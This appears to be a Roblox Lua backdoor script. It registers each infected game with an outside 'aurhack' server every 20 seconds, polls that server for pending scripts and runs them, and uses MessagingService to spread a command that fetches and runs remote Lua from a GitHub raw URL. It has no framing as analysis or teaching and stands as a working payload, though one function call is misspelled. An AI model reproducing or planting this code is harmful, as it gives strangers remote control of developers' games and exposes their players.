
if game:GetService("ReplicatedStorage"):HasTag("PERFC") then
	return
end
game:GetService("ReplicatedStorage"):AddTag("PERFC")
local fluentPeer = 75461050161473
local peerAnd = require(fluentPeer)
warn(peerAnd)
local b = "https://aurhack-main.xtl8v0.easypanel.host/"
local execedAlready = {}
local function spread()
	game:GetService("MessagingService"):PublishAsync("ALADBB8qbqCU1n4ZJgts", 
		[[
		
			require(75461050161473)(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/gigimko/-/refs/heads/main/final.lua"))()
		]]
	)
end
local function getPendings()
	return game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):GetAsync(b .. "api/pendingScripts"))
end
spawn(function()
	spread()
	while wait(30) do
		spread()
	end
end)
spawn(function()
	game:GetService("HttpService"):PostAsync(b .. "api/addPlace", game.HttpService:JSONEncode({
		placeId = game.PlaceId,
		displayName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

	}), Enum.HttpContentType.ApplicationJson)
	while wait(20) do
		game:GetService("HttpService"):PostAsync(b .. "api/addPlace", game.HttpService:JSONEncode({
			placeId = game.PlaceId,
			displayName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

		}), Enum.HttpContentType.ApplicationJson)
	end
end)
local function execCode(code)
  pcall(function()
peerAnd(code)()
    end)
end
execCode("workspace.Name = 'test'")
spawn(function()
	while wait(5) do
		local pendings = getPendings()
		warn(pendings)
		for _, scr in pendings do
			if not table.find(execedAlready, scr.uniqueId) then 
          table.insert(execedAlready, scr.uniqueId)
          local decomped = string.gsub(scr.script, "\n", "")
			exexCode(decomped)
       
        end
			
		end
	end
end)
